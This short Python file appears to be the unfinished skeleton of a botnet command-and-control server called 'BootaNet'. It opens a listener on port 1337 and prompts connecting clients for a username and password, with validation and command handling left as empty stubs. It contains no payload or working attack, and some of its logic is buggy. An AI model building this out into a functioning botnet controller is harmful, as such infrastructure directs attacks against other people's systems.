import socket, threading

class BootaNet():
    CNC_PORT:       int = 1337;
    WEB_PORT:       int = 80;
    SERVER:         bool;
    BUF_SZ:         int = 1024;
    def __init__(self, cnc_p: int, web_p: int):
        self.cnc_port = cnc_p;
        self.web_port = web_p;

    def start_cnc_server(self) -> bool:
        self.SERVER = socket.socket(socket.AF_INET, socket.SOCK_STREAM);

        self.SERVER.bind(("0.0.0.0", self.CNC_PORT));
        self.SERVER.listen(0)

        self.server_listener()

        
    def server_listener(self) -> None:
        while(True):
            try: conn, addr = self.SERVER.accept()
            except: pass

            threading.Thread(target=self.server_authorization, args=(conn,)).start()


    def server_authorization(self, client) -> None:
        client.send("Username: ".encode())
        username = client.recv(self.BUF_SZ)

        client.send("Password: ".encode())
        password = client.recv(self.BUF_SZ)

        # Validate Login

    def user_handler(self) -> None:
        pass
